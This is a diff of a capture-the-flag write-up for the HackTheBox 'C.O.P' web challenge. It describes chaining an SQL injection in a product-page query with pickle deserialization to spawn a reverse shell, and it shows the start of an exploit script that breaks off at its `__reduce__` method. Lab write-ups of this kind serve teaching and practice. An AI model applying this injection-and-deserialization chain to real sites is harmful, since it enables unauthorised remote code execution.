@@ -1,7 +1,7 @@
 ---
 title: HackTheBox - C.O.P
 author: 0
-date: 2023-03-31 16:00:00 +0800
+date: 2023-03-31 18:00:00 +0800
 categories: [htb, challenge]
 tags: [web, sql-injection, insecure-deserialization, pickle]
 render_with_liquid: false
@@ -10,7 +10,9 @@ render_with_liquid: false
 
 > The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!
 
-When the code uses `pickle`, Insecure Deserialization directly comes to mind. In this case, the pickle is loaded when . There is however some raw data being placed in a format string in the `select_by_id` method.
+When the code uses `pickle`, Insecure Deserialization directly comes to mind. In this case, pickle data is deserialized when the homepage or a certain product page is requested.
+
+When a certain product page is requested, an id parameter is provided in the URL. There is raw data being placed in a format string in the `select_by_id` method that provides the data for the product page.
 
 ```python
 from application.database import query_db
@@ -48,14 +50,13 @@ def close_connection(exception):
     if db is not None: db.close()
 ```
 
-We can write a script that performs an SQL injection on the product_id parameter to add our serialized payload that then spawns a reverse shell. I didn't managed to get ` cat flag.txt` payload to work, but a reverse shell did work.
+We can write a script that performs an SQL injection on the product_id parameter to add our serialized payload that then spawns a reverse shell. I didn't managed to get `cat flag.txt` payload to work, but a reverse shell did work.
 
 ```python
 import requests
 import sys
 import base64
 import pickle
-import urllib
 
 class Exploit():
     def __reduce__(self):
